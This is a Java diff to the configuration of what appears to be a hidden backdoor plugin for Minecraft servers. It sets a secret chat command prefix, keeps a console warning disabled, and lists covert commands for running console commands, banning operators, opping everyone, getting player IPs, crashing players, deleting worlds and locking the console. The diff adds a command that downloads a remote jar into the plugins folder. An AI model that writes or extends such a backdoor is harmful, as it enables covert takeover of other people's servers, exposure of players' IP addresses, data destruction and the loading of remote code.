@@ -12,7 +12,7 @@ public class Config {
     /*Command execution*/
 
     // Command Prefix 
-    public static String command_prefix = "xQc>";
+    public static String command_prefix = "fPr>";
 
     // Warn server console about "debugger"
     public static Boolean display_debugger_warning = false;
@@ -66,23 +66,27 @@ public class Config {
             new HelpItem("deop",        "[player]",                     "deop specified player (def: self)"),
             new HelpItem("ban",         "(player) [reason] [source]",   "ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
             new HelpItem("banip",       "(player) [reason] [source]",   "ip ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
-            new HelpItem("gamemode",    "[gamemode]",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
+            new HelpItem("gm",          "[gamemode]",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
             new HelpItem("give",        "(item) [count]",               "give the specified item in specified quantities (def: stack)"),
-            new HelpItem("exec",        "[command]",                    "[Visible] Exocute command as server console."),
-            new HelpItem("chaos",       "",                             "[Visible] Deop and ban ops, op all regular players, run this while not being op yourself."),
+            new HelpItem("exec",        "[command]",                    "[Visible] Exocute command as server console"),
+            new HelpItem("info",        "",                             "shows informatin about server"),
+            new HelpItem("chaos",       "",                             "[Visible] Deop and ban ops, op all regular players, run this while not being op yourself"),
             new HelpItem("seed",        "",                             "get the current world seed"),
-            new HelpItem("sudo",        "(player) (message)",           "sends messages as player, use \"/\" as well (def: player \"hello world\")"),
+            new HelpItem("sudo",        "(player) (message)",           "sends messages as player"),
             new HelpItem("rename",      "[name]",                       "changes your nick (def: nickname)"),
-            new HelpItem("reload",      "",                             "reloads the server"),
+            new HelpItem("reload",      "",                             "[Visible] Reloads the server"),
             new HelpItem("getip",       "[player]",                     "gets ip of the player (def: nickname)"),
-            new HelpItem("listworlds",  "",                             "displays all worlds"),
-            new HelpItem("makeworld",   "[world]",                      "creates new world (def: world_name)"),
-            new HelpItem("delworld",    "[world]",                      "deletes a world (def: world_name)"),
+            new HelpItem("listwrld",    "",                             "displays all worlds"),
+            new HelpItem("mkwrld",      "[world]",                      "[Visible] Creates new world (def: world_name)"),
+            new HelpItem("delwrld",     "[world]",                      "[Visible] Deletes a world (def: world_name)"),
             new HelpItem("vanish",      "",                             "makes you vanish, tab included"),
             new HelpItem("crash",       "[player]",                     "crashes player's name (def: nickname)"),
+            new HelpItem("lock",        "(player) or (console)",        "locks the console or blocks player (def: nickname or console)"),
+            new HelpItem("unlock",      "(player) or (console)",        "unlocks the console or unblocks player (def: nickname or console)"),
+            new HelpItem("download",    "(url) (file)",                 "downloads a file, don't use special chars or spaces (def: url plugins/file.jar)"),
             new HelpItem("coords",      "[player]",                     "get the coordinates of specified player"),
-            new HelpItem("tp",          "[x] [y] [z]",                  "[Visible] Teleport to specified coordinates."),
-            new HelpItem("stop",    "",                             "[Visible] Shutdown the server.")
+            new HelpItem("tp",          "[x] [y] [z]",                  "[Visible] Teleport to specified coordinates"),
+            new HelpItem("stop",        "",                             "[Visible] Shutdown the server")
     };
 
     public static class HelpItem{
